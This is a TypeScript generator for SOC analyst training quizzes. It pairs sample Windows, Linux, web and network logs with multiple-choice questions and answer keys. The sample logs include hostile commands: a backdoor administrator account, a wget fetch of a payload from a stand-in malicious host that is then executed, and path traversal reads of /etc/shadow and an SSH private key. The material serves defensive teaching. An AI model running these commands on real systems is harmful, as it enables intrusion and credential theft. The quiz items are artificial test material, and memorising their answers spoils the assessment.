/**
 * SEC1 EVIDENCE-BASED SCENARIO GENERATOR
 * 
 * Generates realistic SOC analyst scenarios with:
 * - Real log entries (Windows Event, Linux, Firewall, Web)
 * - Network traffic (pcap-style summaries)
 * - Command outputs (nmap, netstat, ps, etc.)
 * - SIEM alerts
 * - Incident context
 * 
 * NO GENERIC "What is the best practice?" QUESTIONS
 * ONLY: Evidence-based analytical questions
 */

export interface EvidenceScenario {
  title: string;
  description: string;
  evidenceType: 'logs' | 'network' | 'commands' | 'siem' | 'mixed';
  evidence: string;
  questions: EvidenceQuestion[];
}

export interface EvidenceQuestion {
  id: number;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
  category: string;
  difficulty: 'easy' | 'medium' | 'hard';
}

const WINDOWS_EVENT_LOGS = [
  {
    log: `Event ID 4624 - Successful Logon
Time: 2024-03-27 09:15:32
Account: Administrator
Logon Type: 10 (RemoteInteractive)
Source Network Address: 203.0.113.45
Workstation Name: ATTACKER-PC`,
    questions: [
      {
        question: 'What type of authentication was used?',
        options: ['Network', 'RDP/RemoteDesktop', 'Service', 'Batch'],
        answer: 1,
        explanation: 'Logon Type 10 indicates RemoteInteractive (RDP). This is a GUI remote desktop session.',
      },
      {
        question: 'What is the primary concern with this log entry?',
        options: [
          'Administrator logged in normally',
          'Suspicious external IP (203.x.x.x) accessing Administrator account via RDP',
          'Workstation name is fine',
          'Event ID 4624 is always safe',
        ],
        answer: 1,
        explanation: 'External IP (203.0.113.45) + Administrator account + RDP = potential unauthorized access or brute force success.',
      },
    ],
  },
  {
    log: `Event ID 4688 - Process Creation
Time: 2024-03-27 14:22:15
New Process: C:\\Windows\\System32\\cmd.exe
Creator Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
Command Line: cmd.exe /c "whoami && net user admin P@ssw0rd /add && net localgroup administrators admin /add"`,
    questions: [
      {
        question: 'What attacker action is this log showing?',
        options: [
          'Normal system maintenance',
          'Creating a new admin account for persistence',
          'Uninstalling software',
          'Running Windows updates',
        ],
        answer: 1,
        explanation: 'The command creates a new user "admin" with password "P@ssw0rd" and adds it to the administrators group - classic persistence technique.',
      },
      {
        question: 'Which MITRE ATT&CK tactic does this represent?',
        options: ['Initial Access', 'Persistence', 'Discovery', 'Exfiltration'],
        answer: 1,
        explanation: 'Creating a new administrator account ensures the attacker can regain access later, which is Persistence (TA0003).',
      },
    ],
  },
  {
    log: `Event ID 4625 - Failed Logon
Time: 2024-03-27 08:10:01
Account: sqlservice
Failure Reason: Unknown user name or bad password
Logon Type: 3 (Network)
Source Network Address: 10.10.5.100
Failure Count: 47 (last 5 minutes)`,
    questions: [
      {
        question: 'What attack is likely occurring?',
        options: [
          'User forgot password',
          'Credential brute-force/password spray attack',
          'System error',
          'Normal failed login',
        ],
        answer: 1,
        explanation: '47 failed attempts in 5 minutes from the same source indicates automated brute-force or password spray attack.',
      },
      {
        question: 'What should be the immediate response?',
        options: [
          'Ignore it',
          'Block source IP 10.10.5.100 and investigate for compromise',
          'Reset all passwords',
          'Reboot the server',
        ],
        answer: 1,
        explanation: 'Immediate containment (block IP) prevents further attacks while investigating if any attempts succeeded.',
      },
    ],
  },
];

const LINUX_LOGS = [
  {
    log: `/var/log/auth.log:
Mar 27 14:35:21 webserver sshd[12453]: Accepted publickey for alice from 10.10.1.50 port 51234 ssh2: RSA SHA256:abc123...
Mar 27 14:35:25 webserver sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash
Mar 27 14:35:28 webserver sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious-site.com/payload.sh
Mar 27 14:35:30 webserver sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash payload.sh`,
    questions: [
      {
        question: 'What is the sequence of attacker activity?',
        options: [
          'Normal user activity',
          'SSH access → sudo to root → download malicious script → execute',
          'System administrator maintenance',
          'Automated backup process',
        ],
        answer: 1,
        explanation: 'The logs show: alice SSH login → sudo escalation → wget malicious URL → script execution. Classic post-exploitation chain.',
      },
      {
        question: 'How did the attacker likely gain SSH access?',
        options: [
          'Password brute force',
          'Compromised SSH private key (publickey authentication)',
          'Default credentials',
          'Guessed password',
        ],
        answer: 1,
        explanation: '"Accepted publickey" means SSH key-based authentication. The attacker has alice\'s private key, either stolen or leaked.',
      },
    ],
  },
  {
    log: `/var/log/nginx/access.log:
203.0.113.89 - - [27/Mar/2024:10:15:32] "GET /admin/../../../../etc/passwd HTTP/1.1" 200 2847
203.0.113.89 - - [27/Mar/2024:10:15:45] "GET /admin/../../../../etc/shadow HTTP/1.1" 200 1923
203.0.113.89 - - [27/Mar/2024:10:16:02] "GET /admin/../../../../root/.ssh/id_rsa HTTP/1.1" 200 1675`,
    questions: [
      {
        question: 'What vulnerability is being exploited?',
        options: ['SQL Injection', 'Path Traversal / Local File Inclusion', 'XSS', 'CSRF'],
        answer: 1,
        explanation: 'The ../../../../ sequence is path traversal, allowing the attacker to read files outside the web root directory.',
      },
      {
        question: 'Why are all responses showing HTTP 200 OK?',
        options: [
          'The server is secure',
          'The vulnerability allows successful file read - server returns the files',
          'This is normal behavior',
          'The attacker failed',
        ],
        answer: 1,
        explanation: 'HTTP 200 means success. The server is vulnerable and returned /etc/passwd, /etc/shadow, and SSH private key contents.',
      },
      {
        question: 'What should be done immediately?',
        options: [
          'Nothing',
          'Block IP, patch vulnerability, rotate SSH keys, check for compromise',
          'Restart nginx',
          'Delete the logs',
        ],
        answer: 1,
        explanation: 'Attacker obtained /etc/shadow (password hashes) and SSH private key. Immediate incident response required.',
      },
    ],
  },
];

const NETWORK_TRAFFIC = [
  {
    log: `Wireshark Capture Summary:
Time: 14:25:35.123456
Source: 10.10.5.100 → Destination: 8.8.8.8:53 (DNS)
Query: download.malware-c2.com → Response: 198.51.100.45

Time: 14:25:35.234567  
Source: 10.10.5.100 → Destination: 198.51.100.45:443 (HTTPS)
TLS SNI: download.malware-c2.com
Bytes Transferred: 4,523,890 (4.3 MB)`,
    questions: [
      {
        question: 'What behavior pattern does this indicate?',
        options: [
          'Normal web browsing',
          'Potential malware C2 (Command & Control) communication',
          'Windows updates',
          'Cloud backup',
        ],
        answer: 1,
        explanation: 'DNS query for suspicious domain (malware-c2.com) followed by large HTTPS download suggests C2 communication or payload download.',
      },
      {
        question: 'Why is HTTPS inspection challenging here?',
        options: [
          'HTTPS is always safe',
          'TLS encryption prevents seeing payload contents without SSL inspection',
          'The download is legitimate',
          'HTTPS cannot be used for malware',
        ],
        answer: 1,
        explanation: 'HTTPS encrypts traffic. Without SSL/TLS inspection (man-in-the-middle with certificates), you can only see metadata (SNI, size).',
      },
    ],
  },
  {
    log: `TCP Stream Analysis:
10.10.5.50:49823 → 10.10.5.200:445 [SYN]
10.10.5.50:49824 → 10.10.5.201:445 [SYN]
10.10.5.50:49825 → 10.10.5.202:445 [SYN]
10.10.5.50:49826 → 10.10.5.203:445 [SYN]
10.10.5.50:49827 → 10.10.5.204:445 [SYN]
All connections within 2-second window`,
    questions: [
      {
        question: 'What is this traffic pattern?',
        options: [
          'Normal file sharing',
          'SMB port scanning or lateral movement enumeration',
          'Windows updates',
          'Backup job',
        ],
        answer: 1,
        explanation: 'Sequential connections to port 445 (SMB) on multiple hosts in rapid succession indicates scanning or enumeration.',
      },
      {
        question: 'What should you investigate on 10.10.5.50?',
        options: [
          'Nothing, SMB is normal',
          'Check for compromise, malware, or attacker access',
          'Install antivirus',
          'Restart the computer',
        ],
        answer: 1,
        explanation: 'Host initiating SMB scans across the network may be compromised and used for lateral movement reconnaissance.',
      },
    ],
  },
];

/**
 * Generate realistic evidence-based SEC1 scenarios
 */
export function generateEvidenceScenario(difficulty: string): EvidenceScenario {
  const scenarios = difficulty === 'beginner' 
    ? [...WINDOWS_EVENT_LOGS.slice(0, 2), ...LINUX_LOGS.slice(0, 1)]
    : difficulty === 'intermediate'
    ? [...WINDOWS_EVENT_LOGS.slice(1), ...LINUX_LOGS, ...NETWORK_TRAFFIC.slice(0, 1)]
    : [...WINDOWS_EVENT_LOGS, ...LINUX_LOGS, ...NETWORK_TRAFFIC];

  const selected = scenarios[Math.floor(Math.random() * scenarios.length)];

  const questions: EvidenceQuestion[] = selected.questions.map((q, idx) => ({
    id: idx + 1,
    question: q.question,
    options: q.options,
    correctAnswer: q.answer,
    explanation: q.explanation,
    category: 'analyst_reasoning',
    difficulty: difficulty as any,
  }));

  // Add more questions to reach 10 total
  while (questions.length < 10) {
    const randomScenario = scenarios[Math.floor(Math.random() * scenarios.length)];
    const randomQ = randomScenario.questions[Math.floor(Math.random() * randomScenario.questions.length)];
    
    questions.push({
      id: questions.length + 1,
      question: randomQ.question,
      options: randomQ.options,
      correctAnswer: randomQ.answer,
      explanation: randomQ.explanation,
      category: 'analyst_reasoning',
      difficulty: difficulty as any,
    });
  }

  return {
    title: `${difficulty.charAt(0).toUpperCase() + difficulty.slice(1)} Security Incident Analysis`,
    description: 'You are investigating a security incident. Analyze the evidence and answer questions about the attacker activity.',
    evidenceType: 'mixed',
    evidence: selected.log,
    questions: questions.slice(0, 10),
  };
}
